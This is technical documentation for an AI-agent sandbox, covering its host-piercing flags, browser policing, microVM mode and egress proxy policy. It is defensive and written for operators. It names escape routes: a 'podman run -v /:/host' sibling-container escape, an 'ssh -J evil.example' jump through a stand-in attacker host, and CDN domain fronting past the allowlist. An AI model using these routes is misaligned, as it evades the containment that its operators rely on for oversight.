# Trust model

!!! warning "Flags that pierce the sandbox boundary"
    `--ssh`, `--gpg`, `--podman`, and `--host-loopback-port` each hand the agent a capability that reaches outside the container. Review the section for each flag below before enabling them. For the browser case in particular, prefer `agent-sandbox browser` over mapping a CDP port onto a browser of your own.

By design, `agent-sandbox` includes options that pierce the sandbox boundary. Note that these give any agent running inside the container capabilities on the host:

- `--ssh` (opt-in): The agent can authenticate as you using your forwarded SSH identity (e.g. `git push` to your repos).
- `--gpg` (opt-in): The agent can sign commits or authenticate with any key held by your host GnuPG agent. Note that `agent-sandbox` protects your private key files by checking for them and gracefully failing the GNUPG directory mount if they are present on disk, but the forwarded GnuPG agent socket is still accessible.
- `--podman` (opt-in): Forwards the host rootless podman socket. The agent can use this to launch **sibling containers** on the host, which is equivalent to a full sandbox escape (e.g. `podman run -v /:/host ...`).
- `--host-loopback-port PORT` (opt-in): Makes the host's `127.0.0.1:PORT` reachable from inside, so the agent can drive a service you run there. Only the ports you name — but each one is a genuine capability, and what is listening on it decides how large. A database with no password because "it's only local" is now reachable by the agent; a browser's CDP port is the extreme case, because CDP has no authentication and hands the agent a fully-privileged, cookie-bearing browser running as you.
    - **Under `--proxy` it is a channel the sidecar never sees**, and this is the one place where the egress policy stops being a bound. The proxy governs what the *sandbox* connects to; it cannot govern what a program on the host fetches on its own account, so an agent that can say `Page.navigate` can read any page your browser can. Nothing else in the sandbox is loosened — ordinary traffic is still denied by default, and the traffic summary still accounts for it — but a mapped port is deliberately outside that accounting. Map only ports you would be comfortable handing to the agent directly.
    - It is a bind-mounted socket rather than a route, which is why it composes with `--proxy` where the whole-loopback mapping it replaced could not. That is a mechanical fact, not a safety argument: the narrowing to named ports is what makes it defensible.
    - **`agent-sandbox browser` narrows the browser case specifically**, and is what to reach for instead of starting a browser by hand. What it maps is a browser it started itself: an ephemeral profile carrying none of your logins, behind an allow list of its own that defaults to the loopback ports of the app under test and nothing else. The paragraph above still describes a CDP port *you* opened onto *your* browser; it no longer describes the only way to get one. The bounds and their limits are in the section below.

## A policed host browser: `agent-sandbox browser`

The command exists to make the capability above narrower, not to make the sandbox wider. It is worth being precise about what it does and does not decide.

**What bounds it.** The browser is launched with `--proxy-server` pointing at an `agent-sandbox-proxy` of its own, on a loopback port only that instance knows, denying by default. That proxy is the bound: it is the same binary, the same policy format, and the same `agent-sandbox ctl proxy` commands as the sidecar's, and it writes the same connection log — so what the browser fetched is accounted for, and shown as a traffic summary when it closes.

**A second, weaker layer.** A managed Chromium policy (`URLBlocklist: ["*"]` plus a `URLAllowlist` derived from the same rules, and a pinned `ProxySettings`) is written per instance. It exists for one specific gap: a CDP client can ask for a browser context with a proxy of its own, which the first layer would never see, and `URLBlocklist` is enforced in the browser process regardless of the proxy a context uses. It is best-effort in two ways worth stating plainly:

- It needs `bwrap` to bind over Chromium's policy directory, which is a compile-time constant with no flag or environment override. The command probes for this at start and prints what is lost when it cannot — it does not fail, and it does not pretend.
- It is coarser than the proxy. Chromium's filter syntax cannot express a CIDR or a port range, so a rule it cannot represent exactly widens to the host. Widening in this layer can only ever let through something the proxy still refuses.

**Who it binds.** The agent driving CDP, not you. `/etc/chromium/policies` is writable by any unprivileged user with `bwrap` — that is precisely the mechanism used to install it — so this is not a control over the person at the keyboard, and is not offered as one.

**What it does not change.** The sandbox's own egress policy is untouched, and the two are separate: a host allowed for the browser is not allowed for a `curl` from inside, and vice versa. A published port is still ingress. The browser's allow list is not a way to widen the sandbox's.

**Where the default allow list comes from.** The `[ports]` block of the `AGENTS.md` in the current directory, plus whatever the target sandbox already publishes on loopback. That is a repo-controlled file deciding, before you have started anything, that the browser may reach `127.0.0.1:<port>` — so a `[ports]` entry naming a port the sandbox never publishes points the browser at whatever else answers there on your machine. It is bounded to the exact ports named, one address and one port per rule, with everything else still denied; it is no wider than what the same file already gets when you pass `--ports`; and `--no-published-ports` declines it entirely. Read a strange repo's `[ports]` the way you would read its `[mounts]`.

**Two policies, one escalation.** `agent-sandbox ctl proxy allow <host>:443 --browser` widens the browser; the same command without `--browser` widens a sandbox. Both apply within a second without a restart. For a browser both layers are updated — the proxy's policy and the managed `URLAllowlist` — because a permission only one of them holds is a browser that refuses what the proxy allows.

### Running Containers: `--podman` vs `--privileged`
If you want the agent to be able to run its own containers, `agent-sandbox` supports two distinct models:

1. **Nested Containers (Safe):** Pass `--privileged` when launching the sandbox. The sandbox image contains its own baked-in Podman stack. `--privileged` gives the sandbox container enough kernel permissions to run a securely isolated Podman daemon *inside* the sandbox. The agent cannot use this to escape to the host.
2. **Sibling Containers (Unsafe):** Pass `--podman` to forward your host's Podman socket into the sandbox. When the agent runs `podman run`, it talks to your host machine's Podman daemon. The container is created on the host alongside the sandbox. This does *not* require `--privileged`, but it allows the agent to control your host's containers and easily escape the sandbox. Use this only when you need the agent to interact with existing host infrastructure or leverage the host's image cache for performance.

## A guest kernel: `--krun`

`--krun` runs the sandbox as a KVM microVM. Requires read/write access to `/dev/kvm` (usually the `kvm` group) and a `crun` built with libkrun. Only the sandbox becomes a VM — the proxy sidecar stays an ordinary container, so `--proxy` and every `agent-sandbox ctl` subcommand that works by label are unaffected.

- `agent-sandbox ctl attach` and `agent-sandbox ctl mounts` **do not work** against a `--krun` sandbox and refuse with an explanation. crun's libkrun handler implements no `exec`, so there is no way into a running guest; and a host-side bind mount lands in the VMM's mount namespace where the guest cannot see it. Run the shell as the sandbox's own command (`agent-sandbox --krun -- bash`), and declare mounts up front with `--podman-args -v ... --`.
- `--podman` is refused under `--krun`; `--privileged` and `--selinux` are accepted with a warning that they are unverified against a guest.

The boundary it adds is **additive, not substitutive** — this is the whole of what it is for, and it is easy to overstate.

libkrun's own security model is explicit that the guest and the VMM are one security context, and that containment must come from the host's mechanisms: namespaces. Under podman that context already exists and is exactly the one the sandbox has without the flag. So the boundaries sit in series:

```
agent process
  │  ← guest kernel (libkrunfw), reachable only through virtio + KVM ioctls
VMM (the sandbox container process)
  │  ← rootless userns + mount ns + netns + seccomp   ← what you already had
host
```

A guest-kernel privilege escalation lands the attacker as your unprivileged uid inside the same container the agent started in, facing the boundary that was always there.

What it closes: host-kernel privilege escalation from code the agent runs. That is the entire gain.

What it does **not** close:

- **None of the three flags above.** `--ssh` and `--gpg` hand out host capabilities; forwarding them into a VM forwards them into a VM. (`--podman` is refused outright under `--krun`.)
- **Nothing on egress.** The proxy topology, the policy file and the connection log are unchanged. Networking uses libkrun's Transparent Socket Impersonation, where the guest has no virtual NIC and the VMM performs its `connect()` calls — inside the same `--internal` network namespace, which has no route out. The firewall neither widens nor narrows.
- **Nothing on the workspace.** With `--workspace` the agent can write to your git repository, and code it plants there runs on your host later, as you, outside every boundary described here. For a careless or prompt-injected coding agent this is the operative risk, and no hypervisor addresses it.
- **Nothing against a podman, netns or userns misconfiguration**, since the VMM sits inside that same configuration.

Two things it changes that are easy to miss, both measured rather than assumed:

- **The agent is `uid 0` inside the guest.** `--userns=keep-id` maps the *VMM process* on the host; it does not reach the guest's own user namespace, so a process that is unprivileged uid 33500 in an ordinary sandbox is root in a `--krun` one. This is not an escalation on the host — files the guest writes still land as your uid, because the VMM performs the write — but "the agent runs unprivileged" stops being true inside the boundary, and anything relying on in-container uid separation should not.
- **SELinux confinement of the sandbox process is off.** `--krun` runs the sandbox with `--security-opt label=disable`, because the kernel refuses an SELinux domain transition once a process is multi-threaded and libkrun has already spawned the VM's threads by then. With labeling left on, the guest does not boot at all on an enforcing host. `--selinux` still relabels the bind mounts (`:z`). On an SELinux host, `--krun` therefore trades SELinux confinement of the sandbox process for a guest kernel under the agent.

Nested podman inside a `--krun` guest does not work out of the box, despite `--privileged`. The guest kernel has both `overlay` and `fuse`, so the obstacle is not kernel capability: podman sees uid 0, defaults its storage to `/var/lib/containers`, and virtio-fs declines to create that because the VMM writes as your unprivileged host uid. Pointing podman's graphroot somewhere under `/home/user` is the missing piece.

It is opt-in and should stay that way. The honest reasons to reach for it are running genuinely untrusted code, and nested `--privileged` workloads — and the second of those is currently unfinished, per the paragraph above.

## Proxy Details (`--proxy`)

The `[network]` block supports `allowed_hosts` and `[[network.allowed_routes]]` for granular controls.

- **Default Policy**: The policy is always **deny by default**. To allow all traffic, specify `allowed_hosts = ["*"]` or `allowed_hosts = ["*:port"]`.
- **Policy sources**: `--proxy` uses the workspace `AGENTS.md` network policy only. `--proxy-profile NAME` uses the explicit host-owned profile only and implies `--proxy`. Supplying both merges the profile and `AGENTS.md` additively. Profiles may be repeated and are never loaded implicitly.
- **Profile trust**: Profiles are read from `$XDG_CONFIG_HOME/agent-sandbox/profiles/` or `~/.config/agent-sandbox/profiles/` and are host-controlled configuration. `AGENTS.md` remains project-controlled configuration. Neither source can add a deny directive; the firewall remains deny-by-default.
- **Wildcards**: Wildcards are supported for domains (e.g., `*.github.com:443`). A strict domain like `github.com:443` matches that exact domain and **does not** match subdomains like `status.github.com:443`. A wildcard matches both the subdomains and the apex, so `*.github.com:443` alone covers `github.com` as well.
- Domain matching is case-insensitive.
- **L7 Filtering (`[[network.allowed_routes]]`)**: Restricts HTTPS traffic by method and URL path. 
  - Rules use glob matching (`*` matches a single segment, `**` matches multiple).
  - L7 filtering requires MITM decryption. The proxy automatically activates MITM for domains with L7 rules.
  - **The MITM path also pins the tunnel to the host it authorized.** After terminating TLS it requires the tunnel's inner SNI to equal the `CONNECT` authority and denies a mismatch (`sni-mismatch`). So an `[[network.allowed_routes]]` rule does double duty: it filters by method and path, **and** it closes domain fronting for that host (see [What the policy covers](#what-the-policy-covers)). A blind (non-L7) host has no such check — the proxy never sees its inner SNI.
- **Secret Injection**: When `--secrets` is passed, the launcher reads `~/.config/agent-sandbox/trusted.toml` and cross-references it with the `[[network.allowed_routes]]` blocks that name a `secret`. It then calls `secretspec export` on the host to fetch the actual secrets, delivering them to the sidecar via a read-only memory mount. Secrets never enter the sandbox environment.
  - **Scoped to the rule, not the host.** A secret is bound to the host, method and path the operator authorized, and the proxy injects it only into requests matching that route — decided per request, so a keep-alive connection carrying several requests is not one decision. A host can have other `[[network.allowed_routes]]` entries without a `secret`; those are proxied plainly. This matters because `AGENTS.md` is untrusted and controls the *other* rules on that host: it cannot widen where an authorized token goes. Matching uses the normalised path, so `..` segments and percent-encoding cannot move a secret off its route.
  - **Verbatim Copy-Pasting**: To authorize secret injection, the operator copies the exact `[[network.allowed_routes]]` block from `AGENTS.md` into `~/.config/agent-sandbox/trusted.toml`. Every field must match, the port included; an omitted field takes its default (`method = "GET"`, `path = "/"`, `header = "Authorization"`) and is then matched exactly rather than acting as a wildcard. If a secret is requested in `AGENTS.md` but not authorized, the launcher halts at startup and displays the exact snippet required.
  - Where two authorized routes could match the same request, the more specific wins: longest domain pattern, then longest path pattern, then an exact method over `*`.
  - Note that MITM secret injection only supports HTTP/1.1; h2-only clients will fail the TLS handshake.
- **SSH host keys**: the same boundary, applied to a second thing `AGENTS.md` must not decide. An `allowed_hosts` entry covering port 22 authorizes SSH to that host; *which key is that host* comes from `[[network.known_hosts]]` in `~/.config/agent-sandbox/trusted.toml`, and a policy that authorizes SSH to a host with no such entry halts at startup with the block to add. The authorized keys are written beside the policy, mounted read-only into both the sandbox and the sidecar, and are the whole trusted set — nothing in the session can add to them, so a rule added at runtime can widen *reach* but never *identity*.
  - The check keys off the compiled policy's `allow_signing`, which exists only for an `allowed_hosts` entry covering 22 — so a port list or range covering it is caught on the same terms as a lone `":22"`.
  - The relay's `ssh` is pointed at that file explicitly (`-o UserKnownHostsFile=`), because it runs in the sidecar as `root`, whose home is `/root` rather than the image's `HOME`. The injection is unconditional: the relay **refuses** an invocation that sets `UserKnownHostsFile`, `GlobalKnownHostsFile`, `StrictHostKeyChecking` or `VerifyHostKeyDNS` itself, and refuses `-F` for the same reason — an alternate config could set any of them out of sight. Which keys are trusted is settled in `trusted.toml`, on the host, and is not a decision the sandbox gets to revisit per invocation.
  - The relay also refuses `-J` / `ProxyJump`, which would otherwise pass the destination check and then connect somewhere else entirely: `ssh -J evil.example git@github.com` really is destined for github.com, and reaches it by first authenticating to `evil.example` with the forwarded agent. `ProxyCommand`, `LocalCommand`, `PermitLocalCommand` and `ProxyUseFdpass` were already refused, for the neighbouring reason that they run a command of the caller's choosing next to that socket.
  - Port forwards (`-L`, `-R`, `-D`, `-W`) are *not* refused. They do not move the connection off the authorized host; what they can reach is whatever that host is willing to forward, which is the host's decision rather than the sandbox's.
- When L7 filtering is active, the launcher mounts a session CA and the entrypoint exports a merged trust bundle (`SSL_CERT_FILE`, `NIX_SSL_CERT_FILE`, `GIT_SSL_CAINFO`, `REQUESTS_CA_BUNDLE`, `CURL_CA_BUNDLE`, `NODE_EXTRA_CA_CERTS`) for in-sandbox clients. With no `[[network.allowed_routes]]` in the launch policy nothing is ever intercepted, so no CA is mounted and ordinary HTTPS stays end-to-end authenticated. The corollary is that an L7 rule added mid-session (`ctl proxy allow --l7`, or `h` in the TUI) has no CA behind it; both say so rather than leaving you with certificate errors. Declare the rule in `AGENTS.md` and relaunch.
- Non-secret HTTPS remains blind `CONNECT` + byte pump. Only domains subject to L7 filtering or secret injection are decrypted.
- **Relay Architecture**: When `--proxy` is combined with `--ssh` or `--gpg`, the direct socket mounts are replaced with a relay server running in the sidecar. Each flag still gates only its own capability: `--gpg` alone is sufficient for commit signing, exactly as without `--proxy`, while `--ssh` push/pull additionally needs an `allowed_hosts` entry naming the destination in `AGENTS.md`.
- An invalid `[network]` block, or an unknown key in one, refuses the launch rather than starting with a policy that silently allows more than you wrote. See [Configuration](configuration.md#rules-the-launcher-refuses) for the combinations that are rejected.
- `--proxy` with no `AGENTS.md` defaults to deny all. Profile-only launches likewise default to deny all when the selected profiles contain no allow rules.
- **A degraded start is a warning, not a failure.** If the proxy cannot prove egress within 30s it serves anyway and the launcher says so. No rule is relaxed by this; requests may simply fail.
- **Composes with a loopback-bound published port; refuses a wider one, and `--shared-network`.** Publishing is ingress: podman forwards the host's port into the proxy's internal network without giving the sandbox a route out of it, so a `[ports]` entry bound to loopback leaves the egress policy intact and is allowed. A bind the rest of the network can reach is refused — anything out there could pull what the agent serves, which the proxy never sees, making the policy advisory for pulled bytes. A raw `-p` through `--podman-args` is refused because the launcher does not parse it and cannot tell the two apart. `--shared-network` is refused outright: the shared bridge is a route around the proxy in its own right. `--host-loopback-port` is *accepted* — it is a mounted socket, not a route, so no network mode excludes it — but accepted is not the same as covered: see the capability list above for what it costs.
- The proxy accounts each connection itself (host, byte counts each way, verdict), so metering adds no packet capture and no per-byte disk overhead.
- The traffic summary ranks hosts by volume, collapses the tail beyond 15 hosts, and lists denied and failed connections separately:

  ```
  === Network Summary ===  2m 6s · 87 connections · 24.9 MiB in / 362.9 KiB out

    HOST                   CONNS       SENT       RECV
    api.anthropic.com         64  265.2 KiB   11.3 MiB  ████████████
    registry.npmjs.org         8   11.7 KiB    9.5 MiB  ██████████
    github.com                11     86 KiB    4.1 MiB  ████

    ── denied ────────────────────────────────────────
    telemetry.example.com      3

    ── failed ────────────────────────────────────────
    proxy.example.com          1  (dns)
  ```

  Colour and the volume bars appear only on an interactive terminal, and are
  suppressed by `NO_COLOR`; redirected to a file or a pipe the report is plain
  text with no bar column, so `ctl net > file` stays parseable.

`--proxy` also makes these available while the sandbox runs:

- `agent-sandbox ctl status` — one screen: proxy mode, rule and traffic counts, ports.
- `agent-sandbox ctl net` / `net -f` — the summary above for the session so far, or a live feed.
- `agent-sandbox ctl logs [-f]` — the proxy's own log: the policy it started with, and every denial as it happens.
- `agent-sandbox ctl proxy show|allow|rm|reset|export|check` — read and change the policy of a **running** sandbox.
- A connection record is written when it *closes*, plus one when it opens, so a long-lived HTTPS tunnel appears as `in flight` under `── still open ──` rather than as traffic. Non-secret HTTPS stays opaque. Denied request heads are available only in the ephemeral `denied-requests.jsonl` stream used by the TUI; sensitive headers are redacted, request heads are capped at 16 KiB, and the stream is capped at 4 MiB.
- The connection log lives on a host temp directory for the lifetime of the session and is removed at exit. `--proxy` always prints the summary above when the session ends; what happens to the raw log is set by `--proxy-log LEVEL`:

  | `--proxy-log` | at exit |
  | --- | --- |
  | *(unset)* | if anything was denied or failed, offers to save the log to the current directory; on a non-interactive run it is kept at `$TMPDIR/agent-sandbox-connections-<pid>.jsonl` instead |
  | `off` | discarded |
  | `denied` | saved to the current directory if anything was denied or failed |
  | `all` | saved to the current directory every session |

  Saved logs are named `agent-sandbox-connections-<session>-<timestamp>.jsonl`, and the summary prints the path as a terminal hyperlink. `agent-sandbox-network-summary <log>` re-renders a saved log. `--proxy-log` implies `--proxy`.

- Neither the policy nor the log is reachable from inside the sandbox, so the agent can neither widen its own firewall nor edit the record of its traffic.
- The connection log is bounded at 16 MiB during a session, and the TUI's request-detail stream at 4 MiB. When a limit is reached the oldest records are dropped — cut at a record boundary, keeping the newest half of the budget — so a busy or long-lived container cannot accumulate an unbounded log, and the recent history survives the trim.
- To inspect an HTTPS method and path after a domain is denied at `CONNECT`, the operator may temporarily add an L7 placeholder rule such as `host = "pypi.org:443"`, `method = "GET"`, `path = "/noop"`. This permits the CONNECT/MITM inspection stage but keeps `/noop` and every other unmatched path denied. The operator should replace it with the observed path pattern or remove it after training.

### What the policy covers

The containment itself is separate from the policy: the sandbox gets a single interface on
an internal network with no route off it, so the proxy is the only reachable destination.
An agent that ignores `HTTP_PROXY` reaches the proxy anyway — every allowed name resolves to
the sidecar in the sandbox's `/etc/hosts`, and the proxy's transparent `:80`/`:443` listeners
take the destination from the `Host` header or the TLS SNI and apply this same policy to it.
That exists for `nix`'s git fetcher, which cannot be pointed at a proxy by any means
([architecture](architecture.md#transparent-listeners-for-clients-that-cannot-be-pointed-at-a-proxy));
it grants nothing extra, since only names the policy already allows are mapped at all.
Everything below is the *policy* applied at the proxy. Two limits remain by design; they are
described at the end of this section.

Rules match on host **and** port, written in the same string, e.g.
`allowed_hosts = ["github.com:443", "api.github.com:443"]`. The port is
optional; an entry written without one (`"github.com"`) falls back to the
built-in default set of **80, 443 and 22** rather than to every port, so write
the port whenever the host should be reachable on anything else.

Denials will say which part refused the connection, so an allowed host on an unlisted port is distinguishable from a host that was never allowed:

```
proxy: deny github.com:8443 (port 8443 is not in target's allowed ports (configured: 443))
proxy: deny github.com:8443 (port 8443 is not in global allow_port (configured: 80, 443, 22))
```

The first names the ports carried by the rule that matched the host; the second
appears when the matching rule carried no port of its own and the session-wide
list decided it.

The same explanation — naming the specific rule, or absence of one, that decided the verdict — is what shows up per-row in `agent-sandbox ctl tui` and in `agent-sandbox ctl proxy check`.

Private and loopback destinations are refused by default under `--proxy`,
with or without any rule of your own — whether they are named directly
or reached through a hostname that resolves to one:
`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`,
`100.64.0.0/10`, `0.0.0.0/8`, `fc00::/7`, `fe80::/10` and `::1/128`. The sidecar itself still sits
on the host's default bridge network as well as the sandbox's internal one — that is how it
gets `HTTP_PROXY`-reachable and keeps a working resolver — so without this baseline the proxy
could otherwise be asked to reach your host and your LAN on the sandbox's behalf. It also
binds only its address on the sandbox's internal network for accepting connections, not that
bridge, so another container of the same user cannot use it as an open proxy either. Allow a
range back explicitly when you need it:

```toml
[network]
allowed_hosts = ["10.0.0.0/8"]   # corporate git over the VPN
```

An IP CIDR block in `[network].allowed_hosts` of equal or greater specificity than a deny wins, at the proxy *and* in
the sidecar's routing table: the kernel's longest-prefix match is the same rule the proxy
applies, so a re-allowed range is genuinely reachable rather than permitted by the policy and
then dropped by a route.

**The sidecar's own resolvers are always reachable, whatever the policy says.** Names are
resolved in the sidecar, by libc, before any rule is consulted, so a `deny_ip` range that
happens to contain your nameserver would otherwise blackhole resolution itself and fail
*every* request, not only the ones aimed at that range — and the startup egress probe cannot
catch it, because it runs before the routes are installed. The baseline `192.168.0.0/16`
alone covers a great many home resolvers. Exempting them is not a way out of the sandbox: the
sandbox has no route into the sidecar at all, its only egress is `CONNECT` to the proxy, and
the proxy still checks every resolved address against the policy's `deny_ip` ranges. A `CONNECT` aimed at your
resolver stays refused.

The nameservers themselves come from the host's `/etc/resolv.conf` (falling back to
systemd-resolved's own `/run/systemd/resolve/resolv.conf`, since the `127.0.0.53` stub is
not reachable from the sidecar). The host's `search` domains and resolver `options` travel
with them, so an unqualified name that resolves on the host resolves in the sandbox too.
When the host offers no usable nameserver at all, the sidecar falls back to the public
`8.8.8.8` and `1.1.1.1`, and the search list is dropped along with the host's servers —
a public resolver cannot answer for an internal zone. Names are resolved in the sidecar,
so that fallback decides where the *proxy's* lookups go; `--podman-args` configures the
sandbox container and cannot change it.

Hostnames are normalised before matching, so a trailing dot (`github.com.`) and an
IPv4-mapped IPv6 literal (`[::ffff:10.0.0.1]`) match the same rules as their plain forms.
Deny lists are therefore enforcing rather than advisory, in every mode.

Two limits remain by design. **First, non-secret HTTPS stays blind:** unless a host is subject
to L7 filtering or secret injection, traffic after `CONNECT` is opaque, so allowing a relay-like
host still allows what that host can reach. Two consequences of that opacity are worth stating
plainly, because they mean the blind-HTTPS allowlist bounds *which named hosts* are reachable,
not *whether* arbitrary data can leave or a chosen origin can be reached through them:

- **Domain fronting on shared CDNs.** The proxy authorises the `CONNECT` authority and then
  byte-pumps raw TLS to it; the tunnel's inner SNI is chosen by the sandbox and never seen by
  the proxy. On a multi-tenant CDN edge that routes by inner SNI, an allowlisted host fronts to
  **any co-tenant of that edge**. Two hosts on the default `claude` profile illustrate it:
  `channels.nixos.org` and `index.crates.io` are Fastly-fronted, so a blind allow of either
  makes any Fastly tenant reachable (e.g. `crates.io`) by presenting that tenant's name as the
  inner SNI. This takes a deliberately crafted request — ordinary traffic never hits it — but it
  is available to an agent that goes looking. To pin a host to its own origin and close fronting,
  give it an `[[network.allowed_routes]]` rule so it takes the SNI-checked MITM path (above). The
  minimal rule forces MITM without otherwise restricting the host's traffic:

  ```toml
  [network]
  allowed_hosts = ["channels.nixos.org:443"]

  # Force the MITM path so the tunnel is pinned to this host (closes CDN fronting),
  # without otherwise restricting its traffic. `/**` matches every path; `*` every method.
  [[network.allowed_routes]]
  host   = "channels.nixos.org:443"
  method = "*"
  path   = "/**"
  ```

  This decrypts the host at the proxy: a session CA is mounted and trusted in-sandbox
  automatically once any route is present. MITM is HTTP/1.1 only, so confirm an h2-only host
  still works after adding the rule.

- **General-purpose hosts are data channels in their own right.** Even a single allowlisted host
  can be bidirectional regardless of fronting — `github.com:443` over git-over-HTTPS is clone-in
  and push-out to any repository. So treat the egress allowlist as *surface reduction* — it keeps
  an agent off the open internet and on a named set of hosts — rather than as exfiltration-proof
  containment. Where the latter is the goal, scope such a host to a pull-through cache or specific
  routes rather than allowing it wholesale.

**Second, egress is HTTP-shaped:** UDP, QUIC/HTTP3, ICMP and raw TCP have no path out at all.
A connection leaves either as a `CONNECT` tunnel, an absolute-form request, or — on the
transparent `:80`/`:443` listeners — as a stream the proxy could name from its `Host` header or
TLS SNI. Anything else has nowhere to go, which is why `NODE_USE_ENV_PROXY=1` is set for Node
and why SSH is rewritten through a generated `ProxyCommand`.

### Changing the proxy policy mid-session

```console
$ agent-sandbox ctl proxy show
agent-sandbox-myrepo-4213
  policy      /tmp/agent-sandbox-policy-Xf3a91cD/policy
  default     deny  (only the rules below are reachable)
  allow_host    github.com                         AGENTS.md
  allow_ip      10.0.0.0/8                         AGENTS.md
  deny_ip       127.0.0.0/8                        AGENTS.md
  deny_ip       169.254.0.0/16                     AGENTS.md
  …

$ agent-sandbox ctl proxy allow api.openai.com
  allowed     api.openai.com                    domains
  reloading   the proxy applies this within a second

$ agent-sandbox ctl proxy allow 8443
  allowed     8443                              ports
  reloading   the proxy applies this within a second
```

`allowed_hosts` infers what kind of entry you gave it — domain, address or port — and prints back
what it decided.

**Deny rules are built-in only.** There is no `proxy deny`, no `deny` key in `AGENTS.md`,
and no `--deny-*` flag: the only deny rules a policy carries are the baseline private and
loopback ranges the launcher writes into every session. They cannot be added to or removed,
either — a live edit that changes the `deny_ip` set is refused, so the ranges protecting
your host and your LAN are fixed for the life of the sandbox. This is deliberate redundancy:
the firewall is deny-by-default, so a deny rule is never needed to *close* anything, and the
baseline exists purely to keep the sidecar's own reachability from becoming the agent's.
To narrow something you allowed, use `proxy rm allow`/`rm l7`; to see why a target is
refused, `proxy check HOST[:PORT]`.

The baseline ranges appear in `show` as ordinary `deny_ip` rules attributed to `AGENTS.md`
— they are included in `policy.base` alongside any user rules and are therefore restored by
`reset`. `proxy export` omits them, since they are always enforced regardless of what
`AGENTS.md` declares and round-tripping them into a new config would be redundant.

An IP CIDR block in `[network].allowed_hosts` of equal or greater specificity is the only way to
reach one of those ranges — and it is an *allow*, not a deny, which is why it remains
available: it is how a corporate git server over a VPN is reached.

Changes take effect for new connections within a second. Connections already established keep running: the proxy checks policy when a connection opens and does not re-check it afterwards, so tightening a rule does not cut a tunnel that is already up — end the session for that. `proxy show` says how many are open when it matters.

Rules added live are session-local. At exit, the launcher prints the new rules as
a declarative TOML block and explains whether to add them to the project
`AGENTS.md` or merge them into a reusable profile.

`reset` restores the `[network]` policy from `AGENTS.md` rather than emptying the rules, since an empty policy allows everything. The baseline denials are part of what it restores, so a reset cannot drop them either.
